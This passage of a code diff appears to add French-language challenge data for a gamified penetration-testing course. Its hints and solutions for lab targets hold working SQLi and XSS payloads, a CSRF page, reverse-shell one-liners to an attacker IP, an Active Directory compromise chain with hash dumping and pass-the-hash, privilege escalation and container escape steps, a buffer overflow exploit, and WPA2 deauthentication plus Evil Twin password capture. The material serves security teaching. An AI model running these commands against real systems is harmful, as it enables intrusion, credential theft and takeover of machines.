+      "Workflow complet :\n```bash\n# 1. Scan rapide pour voir ce qui est ouvert\nnmap -sV -sC -p- -T4 $IP -oN nmap-full.txt\n\n# 2. Énumération web sur port 80\ngobuster dir -u http://$IP -w /path/to/common.txt -o gobuster.txt\n\n# 3. SMB enum\nenum4linux -a $IP > enum4linux.txt\nsmbclient -L //$IP -N\n\n# 4. Compile dans report.md avec les sections : Recon, Web, SMB, Users\n```\nLe but n'est PAS d'exploiter ici, juste de bien recon. L'exploit viendra dans les boxes suivantes."),
+  ],
+  'c-main-2': [
+    c('cm2c1', 'PortSwigger : SQL injection', '40 min',
+      "Sur PortSwigger Web Academy, fais le lab gratuit \"SQL injection vulnerability in WHERE clause allowing retrieval of hidden data\". Trouve la requête qui révèle les produits cachés.",
+      "Le lab est marqué SOLVED dans ton compte PortSwigger.",
+      "L'app filtre par `category='Gifts' AND released=1`. Le bouton de catégorie passe ce paramètre dans l'URL. Comment commenter le `AND released=1` ?",
+      "Sur le lien de catégorie, modifie l'URL pour passer : `?category=Gifts'--`. Le `--` commente la suite. La requête devient `... WHERE category='Gifts'-- AND released=1` → tous les Gifts s'affichent (même non released)."),
+    c('cm2c2', 'PortSwigger : Reflected XSS', '40 min',
+      "Sur PortSwigger, fais le lab \"Reflected XSS into HTML context with nothing encoded\". Injecte un script qui fait apparaître une alerte.",
+      "Le lab est SOLVED. L'alerte `alert(1)` s'est exécutée.",
+      "Cherche le paramètre `?search=` dans l'URL. Mets-y du HTML brut, voir si c'est rendu tel quel.",
+      "URL : `https://lab.../?search=<script>alert(1)<\/script>`. Le payload est réfléchi sans encoding → le navigateur exécute le script."),
+    c('cm2c3', 'CSRF basique', '30 min',
+      "Sur DVWA (sur ta machine, security level Low), utilise la fonction CSRF. Crée une page HTML qui, si une victime la visite alors qu'elle est connectée à DVWA, change son mot de passe sans qu'elle s'en rende compte.",
+      "Quand tu ouvres ta page HTML attaquante en étant logué à DVWA, ton mot de passe a changé.",
+      "Regarde la requête envoyée par DVWA quand tu changes ton mdp en GET. Recopie l'URL avec les bons paramètres dans une page HTML qui auto-submit ou utilise une img.",
+      "```html\n<!-- attack.html -->\n<html><body>\n<h1>Page innocente</h1>\n<img src=\"http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change\" style=\"display:none\">\n</body></html>\n```\nOuvre cette page dans le même navigateur où tu es connecté à DVWA. Boum, mdp changé sans que tu valides quoi que ce soit. C'est ça CSRF."),
+    l('cm2l1', 'BOSS — Speedrun OWASP Top 10 sur Juice Shop', '4h',
+      "Lance OWASP Juice Shop en Docker (`docker run -p 3000:3000 bkimminich/juice-shop`). Sur 4h, résous le maximum de challenges. Vise au moins : XSS Tier 1, SQL injection Tier 1, Sensitive Data Exposure Tier 1, Broken Auth Tier 2.",
+      "Tu as au moins 8 challenges marqués comme résolus dans le score-board (`/#/score-board`).",
+      "Active le score-board (challenge en lui-même !). Pour SQLi sur le login : `' OR 1=1--`. Pour XSS : champ search ou feedback. Pour Sensitive Data : regarde les fichiers exposés sous /ftp/ ou via /robots.txt.",
+      "Quelques solutions communes :\n- **Score Board** : URL `/#/score-board`\n- **Login Admin (SQLi)** : email = `' OR 1=1--`, password = n'importe\n- **DOM XSS** : dans le search, payload `<iframe src=\"javascript:alert('XSS')\">`\n- **Confidential Document** : URL `/ftp/acquisitions.md`\n- **Five-Star Feedback** : delete tous les feedbacks via DELETE sur `/api/Feedbacks/{id}` (Burp)\n- **Forged Feedback** : crée un feedback en assignant un `UserId` autre que le tien (en POST)\n\nEt y'a beaucoup plus. Le challenge complet : https://pwning.owasp-juice.shop/"),
+  ],
+  'c-main-3': [
+    c('cm3c1', 'Burp Repeater 101', '25 min',
+      "Avec Burp Suite Community, intercepte une requête POST sur DVWA (login form). Envoie-la au Repeater. Modifie le username/password 5 fois et envoie chaque variante.",
+      "Tu as 5 variations envoyées dans Repeater avec leurs réponses différentes.",
+      "Configure ton navigateur sur le proxy Burp (127.0.0.1:8080). Active 'Intercept'. Soumets le form. Clic droit sur la requête → Send to Repeater. Ctrl+R aussi.",
+      "1. Burp > Proxy > Intercept ON\n2. Configure Firefox : Settings > Network > Proxy > 127.0.0.1:8080 (HTTP+HTTPS)\n3. Va sur DVWA, soumets login\n4. Burp intercepte → clic droit → Send to Repeater (Ctrl+R)\n5. Dans Repeater, modifie le body (`username=...&password=...`) et clique Send\n6. Compare les réponses dans le panneau de droite"),
+    c('cm3c2', 'Crack ce hash', '30 min',
+      "Voici un hash MD5 : `5f4dcc3b5aa765d61d8327deb882cf99`. Crack-le avec John ou Hashcat en utilisant la wordlist rockyou.txt.",
+      "Tu trouves le mot de passe en clair (c'est un mot très commun).",
+      "Mets le hash dans un fichier `hash.txt`. Hashcat : `hashcat -m 0 hash.txt rockyou.txt`. -m 0 = MD5. rockyou.txt est dans `/usr/share/wordlists/` sur Kali.",
+      "```bash\necho '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt\nhashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt\n# Le résultat : password\n```\nC'était le hash MD5 de \"password\" — un classique."),
+    c('cm3c3', 'Reverse shell avec netcat', '30 min',
+      "Sur ta VM Kali (l'attaquant), écoute sur le port 4444 avec netcat. Sur une autre VM ou container Linux (la victime), connecte-toi back vers Kali et obtiens un shell distant.",
+      "Sur Kali, tu tapes `whoami` et tu obtiens le user de la machine victime, pas de Kali.",
+      "Attaquant : `nc -lvnp 4444`. Victime : `bash -i >& /dev/tcp/IP_KALI/4444 0>&1`. Si bash ne marche pas, essaie `nc IP_KALI 4444 -e /bin/sh`.",
+      "**Sur Kali (attaquant)** :\n```bash\nnc -lvnp 4444\n```\n\n**Sur la victime** :\n```bash\nbash -i >& /dev/tcp/192.168.1.10/4444 0>&1\n```\n(remplace 192.168.1.10 par l'IP de Kali)\n\nTu obtiens un shell sur Kali, mais tu es sur la victime. Pour avoir un meilleur shell : `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`."),
+    l('cm3l1', 'BOSS — Exploitation guidée Metasploit', '2h',
+      "Sur TryHackMe, fais la room 'Metasploit: Introduction' (gratuite). Apprends à : utiliser msfconsole, chercher un module, configurer RHOSTS/LHOST, lancer un exploit, utiliser meterpreter pour explorer la machine cible.",
+      "Tu obtiens une session meterpreter sur la cible et tu peux lister les fichiers du C:\\Users\\.",
+      "msfconsole > `search [exploit]` pour chercher > `use [path]` > `show options` > `set RHOSTS [ip]` > `set LHOST [ton ip]` > `exploit`. Une fois meterpreter : `sysinfo`, `getuid`, `shell`, `download`, etc.",
+      "Workflow type :\n```\nmsfconsole\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue\nshow options\nset RHOSTS 10.10.x.x\nset LHOST 10.x.x.x  (ton IP THM)\nexploit\n\n# Une fois meterpreter :\nsysinfo\ngetuid\nhashdump\nshell\n```"),
+  ],
+  'c-main-4': [
+    c('cm4c1', 'Mode monitor', '20 min',
+      "Avec une carte WiFi compatible (ou un adaptateur USB type Alfa), passe ta carte en mode monitor avec aircrack-ng et capture les paquets pendant 1 min.",
+      "Tu vois les SSIDs autour de toi avec leurs BSSIDs et canaux dans `airodump-ng`.",
+      "Désactive le NetworkManager : `sudo systemctl stop NetworkManager`. Active monitor : `sudo airmon-ng start wlan0`. L'interface devient `wlan0mon`. Ensuite : `sudo airodump-ng wlan0mon`.",
+      "```bash\nsudo airmon-ng check kill\nsudo airmon-ng start wlan0\n# Vérifie : iwconfig (mode: Monitor)\nsudo airodump-ng wlan0mon\n# Tu vois la liste des AP (BSSID, ESSID, CH, ENC, etc.)\n# Pour revenir en mode normal :\nsudo airmon-ng stop wlan0mon\nsudo systemctl start NetworkManager\n```\n⚠️ Tu ne dois capturer que SUR TON PROPRE RÉSEAU."),
+    c('cm4c2', 'Capture handshake WPA2 (TON réseau)', '30 min',
+      "Sur TON propre réseau WiFi : capture le 4-way handshake WPA2 quand un appareil se reconnecte. Force la déauthentication d'un appareil pour accélérer la capture.",
+      "Tu as un fichier `.cap` qui contient un handshake WPA2 valide (vérifié avec `aircrack-ng capture.cap`).",
+      "1. `airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon` (focus sur ton AP). 2. Dans un autre terminal : `aireplay-ng --deauth 5 -a BSSID wlan0mon` pour forcer la reconnexion. 3. Dans la fenêtre airodump, en haut tu verras `WPA handshake: BSSID`.",
+      "**Étape 1 — repérer ton AP** :\n```bash\nsudo airodump-ng wlan0mon\n# Note BSSID + CH de ton AP\n```\n\n**Étape 2 — focus + capture** :\n```bash\nsudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n```\n\n**Étape 3 — déauth (autre terminal)** :\n```bash\nsudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon\n```\n\n**Étape 4 — vérifier** : retour fenêtre airodump, en haut : `WPA handshake: AA:BB:CC...` ✓\n\n**Étape 5 — crack** : `aircrack-ng -w wordlist.txt capture-01.cap`\n\n⚠️ UNIQUEMENT TON RÉSEAU. Sinon délit pénal."),
+    l('cm4l1', 'BOSS — Lab Evil Twin maison', '3h',
+      "Sur 2 VMs perso : (1) configure une AP Wi-Fi 'fausse' qui imite ton réseau perso (Evil Twin) avec hostapd + dnsmasq, (2) construis un portail captif qui te demande le mdp Wi-Fi quand tu te connectes. C'est un EXERCICE DE COMPRÉHENSION sur des appareils à TOI.",
+      "Quand tu te connectes à ton Evil Twin avec ton autre device, tu vois s'afficher la page captive 'Authentification requise' que tu as créée.",
+      "Pile à utiliser : hostapd (créer l'AP), dnsmasq (DHCP+DNS), iptables (rediriger HTTP vers ton portail), Flask (le portail captif). Bibliothèque clé en main : 'fluxion' ou 'wifiphisher' mais le but est de comprendre, pas juste de cliquer.",
+      "Le setup complet est trop long pour ce hint, mais voici la structure :\n\n1. **hostapd.conf** :\n```\ninterface=wlan0\ndriver=nl80211\nssid=MonReseauPerso\nchannel=6\nwpa=2\n# (ou ouvert pour le test)\n```\n\n2. **dnsmasq.conf** :\n```\ninterface=wlan0\ndhcp-range=10.0.0.10,10.0.0.50,12h\naddress=/#/10.0.0.1\n```\n\n3. **iptables** : redirige tout HTTP vers ton portail :\n```bash\niptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:8080\n```\n\n4. **Portail Flask** : Une page simple qui demande 'Pour accéder à internet, entrez votre mot de passe Wi-Fi'.\n\n⚠️ C'est UNIQUEMENT pour comprendre comment ça marche, sur TES devices. Faire ça en public = délit grave."),
+  ],
+  'c-daily': [
+    c('cDc1', 'HTB Easy box', 'quotidien',
+      "Une box HTB easy par semaine (gratuite, retired). Documente la procédure dans ton hunter-journal.",
+      "Tu as 4 writeups de boxes différentes au bout d'un mois.",
+      "Sur HTB, filtre les machines retired (gratuit avec compte free). Choisis 'easy'. Pour les writeups, regarde IppSec en complément après ton essai.",
+      "Liste de boxes faciles pour démarrer (toutes retired, gratuites) :\n- Lame (très old school)\n- Beep\n- Optimum\n- Granny\n- Blue (EternalBlue)\n- Legacy"),
+  ],
+  'c-boss': [
+    l('cBl1', 'BOSS — 10 boxes HTB easy', '15-30j',
+      "Sur 1 mois max, root 10 boxes HTB easy (gratuites, retired). Le but est de bâtir une vraie méthodologie de pentest.",
+      "Tu as un dossier avec 10 writeups personnels structurés (Recon, Initial Access, Privilege Escalation).",
+      "Méthode : pour chaque box, fais d'abord 1h-2h seul. Si bloqué, va voir UN seul indice (pas la solution complète). Note ce qui t'a fait avancer. C'est le nombre de NOUVELLES techniques apprises qui compte, pas la vitesse.",
+      "Boxes recommandées dans cet ordre :\n1. Lame, Legacy (intro CVE classiques)\n2. Beep, Optimum (énumération web)\n3. Bashed, Networked (LFI, file upload)\n4. Cronos, Sense (DNS, brute force)\n5. Nibbles, Valentine (CMS exploits, Heartbleed)\n\nAprès chaque box : note dans ton journal\n```\n## Box Name\n- IP: ...\n- Time spent: ...\n- New tech learned: ...\n- Mistakes made: ...\n- Tools used: ...\n```"),
+  ],
+
+  // ============= RANG B =============
+  'b-main-1': [
+    c('bm1c1', 'AD lab perso', '2h',
+      "Lance le 'GOAD' (Game Of Active Directory) — un lab AD vulnérable préfait. Setup ESSENTIEL avant tout : c'est un environnement Windows AD complet pour pratiquer.",
+      "Tu as un Domain Controller + 2 workstations Windows en réseau, accessibles depuis ta machine Kali.",
+      "Repo : https://github.com/Orange-Cyberdefense/GOAD. Suis le README pour Vagrant + Ansible. Si trop lourd, alternative : THM 'Attacktive Directory' room (cloud, pas besoin d'install).",
+      "**Setup GOAD light** (recommandé pour débuter) :\n```bash\ngit clone https://github.com/Orange-Cyberdefense/GOAD\ncd GOAD\n# Suis goad-light dans le README\nvagrant up\nansible-playbook -i inventory provision.yml\n```\n\nNécessite ~24Go RAM. Si ton PC ne supporte pas : utilise les rooms TryHackMe AD path."),
+    c('bm1c2', 'BloodHound : la cartographie', '1h',
+      "Sur ton lab AD, lance SharpHound depuis une workstation, importe les données dans BloodHound, et identifie : (1) le shortest path de TON_USER vers Domain Admin, (2) les groupes 'Kerberoastable users', (3) les sessions actives.",
+      "Tu peux montrer un graph BloodHound avec un chemin coloré vers Domain Admins.",
+      "Lance BloodHound (`bloodhound`) + Neo4j en parallèle. Importe le ZIP de SharpHound. Pre-built queries dans BloodHound : 'Find shortest paths to Domain Admins'.",
+      "**Étapes** :\n1. Sur la workstation : `Sharphound.exe -c All` → génère un ZIP\n2. Sur Kali : `neo4j console` puis `bloodhound`\n3. Login Neo4j (default: neo4j/neo4j)\n4. Drag & drop le ZIP dans BloodHound\n5. Pre-built queries (analyse > queries) :\n   - 'Shortest paths to Domain Admins'\n   - 'List all Kerberoastable accounts'\n   - 'Find sessions of Domain Admins'"),
+    l('bm1l1', 'BOSS — Compromission AD complète', '6h',
+      "Sur GOAD ou THM 'Attacktive Directory', réalise la chaîne complète : recon → user initial via Kerberoast → mouvement latéral → privesc → Domain Admin. Documente chaque étape.",
+      "Tu as obtenu le hash NTLM du compte Administrator du domaine (krbtgt ou administrator) et tu peux le passer pour t'authentifier en tant que DA.",
+      "Étapes typiques : nmap sur DC → enum users (impacket) → ASREPRoast / Kerberoast → crack hashes hashcat → SMB/WinRM avec user → BloodHound → trouver chemin → escalade via DCSync ou GenericAll → secretsdump.",
+      "Methodology Cheatsheet :\n```bash\n# 1. Recon\nnmap -p- -sV $DC_IP\n\n# 2. Enum users (sans creds)\nimpacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt\n# OU\nkerbrute userenum --dc $DC_IP -d $DOMAIN users.txt\n\n# 3. ASREPRoast\nimpacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -usersfile users.txt -outputfile asrep.hash\n\n# 4. Crack\nhashcat -m 18200 asrep.hash rockyou.txt\n\n# 5. With user creds — Kerberoast\nimpacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile kerb.hash\n\n# 6. Crack\nhashcat -m 13100 kerb.hash rockyou.txt\n\n# 7. BloodHound (collect)\nbloodhound-python -d $DOMAIN -u $USER -p $PASS -ns $DC_IP -c All\n\n# 8. Find path → exploit ACL → DCSync\nimpacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP\n\n# 9. Pass-the-Hash en DA\nimpacket-psexec -hashes :NTHASH administrator@$DC_IP\n```"),
+  ],
+  'b-main-2': [
+    c('bm2c1', 'Linux Privesc — SUID hunting', '45 min',
+      "Sur une box Linux vulnérable (TryHackMe Linux PrivEsc room), trouve TOUS les binaires SUID inhabituels et identifie celui qui peut être exploité via GTFOBins.",
+      "Tu as escaladé en root via un binaire SUID exploitable.",
+      "Pour lister les SUID : `find / -perm -4000 -type f 2>/dev/null`. Compare avec les binaires courants. Va sur gtfobins.github.io et cherche le binaire suspect → 'SUID' tab.",
+      "```bash\n# Lister tous les SUID\nfind / -perm -4000 -type f 2>/dev/null\n\n# Élimine les classiques (su, sudo, passwd, ping, mount...).\n# Si tu vois `find`, `vim`, `nmap`, `python`, `bash`, etc. avec SUID = jackpot.\n\n# Exemple SUID find :\nfind . -exec /bin/sh -p \\; -quit\n# (le -p préserve le SUID)\n\n# Exemple SUID python :\npython -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n```"),
+    c('bm2c2', 'Windows Privesc — services', '45 min',
+      "Sur une box Windows vulnérable (TryHackMe Windows PrivEsc room), trouve un service avec des permissions trop laxistes (le user peut le modifier ou le path est unquoted) et exploite-le.",
+      "Tu as obtenu un shell SYSTEM.",
+      "Outils : winPEAS (énum auto), `accesschk.exe -uwcqv \"Authenticated Users\" *`, `wmic service get name,displayname,pathname,startmode`. Pour binPath modifiable : `sc config SVCNAME binPath= \"cmd.exe /c net user hacker P@ss123 /add\"`.",
+      "**Service avec write access** :\n```cmd\naccesschk.exe -uwcqv \"Authenticated Users\" *\n# Trouve un service où tu as SERVICE_ALL_ACCESS\n\nsc config VulnService binPath= \"\\\"C:\\Tools\\nc.exe -e cmd.exe ATTACKER_IP 4444\\\"\"\nsc start VulnService\n# Tu reçois un shell SYSTEM sur ton listener\n```\n\n**Unquoted Service Path** :\n```cmd\nwmic service get name,pathname | findstr /i /v \"C:\\\\Windows\" | findstr /i /v \"\\\"\"\n# Si tu vois : C:\\Program Files\\Vendor App\\service.exe (sans quotes)\n# Et que tu peux écrire dans C:\\Program Files\\\n# Place un binaire malicieux : C:\\Program.exe\n# Au prochain start : Windows lance C:\\Program.exe en SYSTEM\n```"),
+    l('bm2l1', 'BOSS — Pivoting multi-machine', '4h',
+      "Sur HTB Pro Lab Dante (ou TryHackMe Wreath), réalise un pivot complet : compromets une machine en DMZ, configure un proxy via Chisel/Ligolo, et accède au réseau interne pour compromettre un 2ème host.",
+      "Tu as un shell sur la 3ème machine (réseau interne) accessible via tes proxies.",
+      "Outils clés : Chisel (`chisel server -p 8080 --reverse` côté attaquant, `chisel client ATTACKER:8080 R:1080:socks` côté pivot). Puis `proxychains nmap` ou Burp via le SOCKS pour atteindre le LAN.",
+      "**Setup Chisel (le plus simple)** :\n\n```bash\n# Sur Kali :\nchisel server -p 8080 --reverse\n\n# Sur la machine pivot (compromise) :\n./chisel client KALI_IP:8080 R:1080:socks\n\n# Sur Kali, configure proxychains4.conf :\necho \"socks5 127.0.0.1 1080\" >> /etc/proxychains4.conf\n\n# Maintenant tu peux atteindre le LAN interne via :\nproxychains4 nmap -sT -Pn -p 80,443,3389 10.10.20.0/24\nproxychains4 ssh user@10.10.20.50\n```\n\nPour Ligolo (plus moderne et rapide), suit la doc : https://github.com/nicocha30/ligolo-ng"),
+  ],
+  'b-main-3': [
+    c('bm3c1', 'Lis du code en ASM', '30 min',
+      "Compile ce C : `int main() { int a = 5; int b = 7; return a + b; }`. Désassemble-le avec `objdump -d` et identifie les instructions qui font l'addition.",
+      "Tu peux pointer les instructions ASM qui chargent 5, 7, et qui font l'addition (`add` ou `lea`).",
+      "Compile en gardant les symboles : `gcc -O0 -o test test.c`. Désassemble : `objdump -d test | grep -A 20 '<main>:'`. Avec -O0, le code reste simple.",
+      "```bash\n# Crée test.c\ncat > test.c << 'EOF'\nint main() { int a = 5; int b = 7; return a + b; }\nEOF\ngcc -O0 -o test test.c\nobjdump -d test | grep -A 15 '<main>:'\n```\nTu verras des `mov $0x5, ...` et `mov $0x7, ...` puis `add` ou `lea` selon l'optimisation."),
+    c('bm3c2', 'Crackme #1', '1h',
+      "Sur crackmes.one, choisis un crackme niveau 'Very Easy' en C. Charge-le dans Ghidra ou IDA Free. Trouve la condition qui valide le password en lisant le code décompilé.",
+      "Tu peux donner le mot de passe valide sans avoir lancé le binaire avec un brute force.",
+      "Cherche la fonction `main`. Regarde s'il y a un `strcmp` ou un test de chaîne. Dans Ghidra : Symbol Tree → Functions → main. Le décompilé est en C-like, lisible.",
+      "Procédure type :\n1. Charge le binaire dans Ghidra (`Ghidra` puis File > Import)\n2. Analyse complète (Yes à toutes les options)\n3. Symbol Tree > Functions > main\n4. Window 'Decompile' à droite\n5. Cherche : `if (strcmp(input, \"...\") == 0)` → le 2e arg c'est le mot de passe\n\nSinon, command-line shortcut : `strings binary | grep -i 'pass\\|key\\|flag'`"),
+    l('bm3l1', 'BOSS — Buffer overflow basique', '3h',
+      "Sur un binaire vulnérable (TryHackMe 'Buffer Overflow Prep' ou un crackme dédié), exploite un overflow de pile pour rediriger l'exécution vers une fonction `win()` cachée. ASLR + canary désactivés (c'est le but, faciliter).",
+      "Tu obtiens un shell ou tu vois 'You won!' affiché par la fonction win().",
+      "Étapes : (1) Confirme le crash, (2) trouve le offset exact avec `pattern_create` + `pattern_offset`, (3) trouve l'adresse de win() avec `objdump -t binary | grep win`, (4) crée le payload `'A' * offset + p32(win_addr)`.",
+      "**Workflow complet** :\n```python\n# Étape 1 : crash le binaire\n./vuln $(python -c 'print(\"A\"*200)')\n# Segfault ?\n\n# Étape 2 : trouve l'offset\nmsf-pattern_create -l 200\n# Mets ce string en input → note la valeur de EIP au crash\nmsf-pattern_offset -l 200 -q EIP_VALUE\n# → offset = 76 (par exemple)\n\n# Étape 3 : adresse de win()\nobjdump -t vuln | grep win\n# 0804852b g F .text 0000... win\n\n# Étape 4 : exploit\npython -c \"import struct; print('A'*76 + struct.pack('<I', 0x0804852b))\" | ./vuln\n```\n\nPour passer à l'exécution de shellcode : il faut que la pile soit exécutable (`-z execstack` à la compilation), puis NOP sled + shellcode."),
+  ],
+  'b-main-4': [
+    c('bm4c1', 'flAWS challenge', '1h',
+      "Sur http://flaws.cloud/, fais les niveaux 1 et 2. C'est un CTF AWS gratuit qui te fait découvrir les misconfigurations S3 par la pratique.",
+      "Tu as les URLs des niveaux 3 et 4 (qui sont les flags des niveaux 1 et 2).",
+      "Niveau 1 : le bucket S3 est listable publiquement. Niveau 2 : tu as besoin d'un compte AWS gratuit pour pouvoir signer tes requêtes.",
+      "**Niveau 1** :\n```bash\n# Le DNS te dit que le site est sur S3\ndig flaws.cloud\n# Liste le bucket :\naws s3 ls s3://flaws.cloud/ --no-sign-request\n# Tu vois 'secret-dd02c7c.html'\n# Va sur http://flaws.cloud/secret-dd02c7c.html → URL niveau 2\n```\n\n**Niveau 2** : nécessite des credentials AWS valides (gratuit) car le bucket n'autorise que les Authenticated AWS Users (mauvaise compréhension du concept = misconfig).\n```bash\naws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/\n```"),
+    c('bm4c2', 'Scan d\'un container', '30 min',
+      "Lance un container Docker volontairement mal configuré (avec `--privileged`). Depuis l'intérieur, trouve le moyen d'accéder au système hôte.",
+      "Tu peux lire `/etc/shadow` du HÔTE depuis le container, alors que ce fichier n'existe pas dans l'image utilisée.",
+      "`--privileged` donne accès aux devices de l'hôte. Depuis le container : `fdisk -l` pour lister les disques. Mount le disque hôte : `mkdir /mnt/host && mount /dev/sda1 /mnt/host` (ou l'équivalent). Le filesystem hôte est dans /mnt/host.",
+      "```bash\n# Lance le container (sur ta machine de test)\ndocker run --rm -it --privileged ubuntu bash\n\n# Dans le container :\nfdisk -l\n# Voit /dev/sda1 (disque hôte)\nmkdir /mnt/host\nmount /dev/sda1 /mnt/host\ncat /mnt/host/etc/shadow\n# Voilà — escape réussi\n```\nLeçon : NEVER --privileged en prod. Et même sans, plein d'autres techniques existent (cap_sys_admin, mounts dangereux, etc.)."),
+    l('bm4l1', 'BOSS — CloudGoat scenario', '3-5h',
+      "Lance un scenario CloudGoat complet (par ex. 'iam_privesc_by_attachment' ou 'rce_web_app'). Compromets l'environnement AWS et obtiens les flags.",
+      "Tu as récupéré le flag final du scenario (clé secrète stockée quelque part dans l'env AWS).",
+      "Setup : il te faut un compte AWS perso (free tier), python, terraform. CloudGoat clone le scenario en Terraform. Tu as un point de départ (cred IAM bas privilège), à toi de pivoter dans AWS.",
+      "**Setup CloudGoat** :\n```bash\ngit clone https://github.com/RhinoSecurityLabs/cloudgoat\ncd cloudgoat\npip install -r requirements.txt\n\n# Configure ton AWS profile :\naws configure --profile cloudgoat\n# Mets une access key + secret avec les droits AWSAdministrator (ton compte perso)\n\n./cloudgoat.py config profile\n./cloudgoat.py config whitelist --auto\n\n# Lance un scenario\n./cloudgoat.py create iam_privesc_by_attachment\n\n# Tu reçois des creds IAM dans le dossier du scenario\n# → utilise pacu / aws cli pour t'évader\n```\n\nQuelques outils utiles dans le contexte :\n- `pacu` (Rhino Sec) : framework AWS exploit\n- `enumerate-iam.py` : trouve ce que ton user peut faire\n- `aws-vault` : gère les profiles propres\n\n⚠️ N'oublie pas de `./cloudgoat.py destroy` à la fin, sinon tu paies."),
+  ],
+  'b-daily': [
+    c('bDc1', 'Une technique MITRE par jour', 'quotidien',
+      "Sur attack.mitre.org, choisis 1 technique par jour, lis-la, et essaie de la reproduire dans ton lab.",
+      "Tu as 7 techniques étudiées et pratiquées sur 1 semaine.",
+      "Filtre par tactique selon ce qui te manque (Initial Access, Privilege Escalation, etc.). Chaque technique a des Procedures (= exemples concrets utilisés par des APTs).",
+      "Suggestions pour démarrer :\n- T1059.001 (PowerShell)\n- T1078 (Valid Accounts)\n- T1110.003 (Password Spraying)\n- T1547.001 (Registry Run Keys)\n- T1003.001 (LSASS Memory)\n- T1021.002 (SMB / Admin Shares)\n- T1055 (Process Injection)"),
+  ],
+  'b-boss': [
+    l('bBl1', 'BOSS — Préparation OSCP', '2-3 mois',
+      "Inscris-toi à OffSec PEN-200 (OSCP) OU complète le path TJnull (~50 boxes HTB OSCP-like, gratuit). Vise la maîtrise complète de la méthodologie : recon, exploitation, post-exploit.",
+      "Tu réussis l'examen OSCP (24h pratique + 24h rapport, ~70/100 minimum) OU tu rootes 40+ boxes du TJnull list sans aide.",
+      "Plan d'attaque sur 3 mois : Mois 1 = consolider Linux/Windows privesc avec les rooms THM. Mois 2 = HTB OSCP-like easy/medium. Mois 3 = Pro Labs + simu d'examen 24h sans dormir (sérieusement).",
+      "Pas de solution courte. C'est un marathon, pas un sprint.\n\nRessources clés :\n- TJnull's list : netsecfocus.com (la liste de boxes recommandées)\n- IppSec : binge tous les writeups OSCP-like\n- 0xdf : writeups détaillés en texte\n- Discord 'OSCP Prep' : entraide entre candidats\n- PWK PDF officiel : à lire en entier\n\n**Test final avant l'exam** : fais une simu de 24h chez toi avec 5 boxes random (pas vues avant). Si tu en root 4/5 → t'es prêt."),
+  ],
+
+  // ============= RANG A =============
+  'a-path-1': [
+    c('ap1c1', 'Premier rapport bug bounty', '4h',
+      "Choisis 1 programme public sur HackerOne, lis le scope (TRÈS attentivement), passe 4h à explorer manuellement avec Burp. Si tu trouves quelque chose, écris un rapport propre.",
+      "Tu as soumis un rapport (même si pas accepté) avec : titre clair, steps to reproduce, impact, suggestion de fix.",
+      "Programmes débutant-friendly : HackerOne 'Hacktivity' filtre par 'beginner-friendly'. Évite les programmes ultra concurrentiels (Google, Apple) au début. Privilégie scope large + bounty modeste.",
+      "Format de rapport pro :\n```\n# Title: [VULN_TYPE] in [FEATURE]\n\n## Summary\n2 lignes max sur ce que c'est.\n\n## Steps to Reproduce\n1. Go to https://...\n2. Login as ...\n3. Submit ...\n4. Observe response shows ...\n\n## Proof of Concept\n[Screenshot OU video courte]\n[Curl command qui reproduit]\n\n## Impact\nQu'est-ce qu'un attaquant peut faire ? Concret.\n\n## Suggested Fix\nValidation côté serveur, escape HTML, etc.\n```"),
+    l('ap1l1', 'BOSS — Première bounty payée', 'variable',
+      "Continue le bug bounty régulièrement (qq h/semaine) jusqu'à valider une vulnérabilité réelle qui te paie. Peu importe le montant, c'est le principe.",
+      "Tu reçois ta 1ère bounty (même 50$). Le rapport est marqué 'Resolved' et 'Bounty Awarded'.",
+      "Stats réalistes : faut souvent 50-200h de pratique avant le 1er rapport accepté. Patience. Spécialise-toi sur 1 type de vulnérabilité (ex: IDOR, XSS) pour devenir efficace.",
+      "Pas de solution magique. Quelques tips :\n- **IDOR** = la goldmine du débutant. Chaque app moderne a des endpoints user/{id}, order/{id} → teste de changer l'id\n- **Subdomains takeover** : aquatone + dnsx + identifie les CNAME orphelins (Heroku, GitHub Pages)\n- **Account takeover** : OAuth flows, password reset flows\n- **Le rapport ÉCRITURE est aussi important que la trouvaille** : prends le temps"),
+  ],
+  'a-path-2': [
+    l('ap2l1', 'BOSS — Engagement Red Team simulé', '1 mois',
+      "Réalise un engagement complet sur un range OffSec PEN-300 (OSEP) ou un Pro Lab HTB (Offshore/Cybernetics). Phishing simulé → Initial Access → Lateral Movement → DA → Persistence → Exfil simulé.",
+      "Tu as obtenu Domain Admin + tu as établi de la persistence + tu as exfil un fichier 'classified' simulé. Le tout en restant 'OPSEC clean'.",
+      "Stack : Cobalt Strike (payant, mais c'est l'industry standard) ou Sliver/Mythic (open source). Maldev avec Sektor7 + Maldev Academy. AMSI bypass + obfuscation à la main.",
+      "C'est trop vaste pour un hint courte. Programme conseillé :\n1. **Sektor7 Malware Dev Intermediate** ou **Maldev Academy** : ~30h\n2. **CRTO** : 6 semaines, lab Cobalt Strike\n3. **HTB Offshore** : 3-6 mois\n4. **Vraie certif** : OSEP (recommandé après ça)"),
+  ],
+  'a-path-3': [
+    l('ap3l1', 'BOSS — Reverse complet d\'un malware sample', '2-4 semaines',
+      "Sur Any.run ou MalwareBazaar, télécharge un sample REAL de malware ancien (pas critique, ex: Emotet ancien). Analyse-le statiquement (Ghidra/IDA) et dynamiquement (sandbox locale isolée). Écris un rapport reverse.",
+      "Tu produis un rapport de 5-10 pages : strings, imports, comportement réseau, persistence, IoCs, TTP MITRE.",
+      "⚠️ EXTRÊME PRUDENCE. Sample dans une VM ISOLÉE sans réseau (host-only). Snapshot avant. ANY.run permet de faire ça en cloud sans risque pour ta machine.",
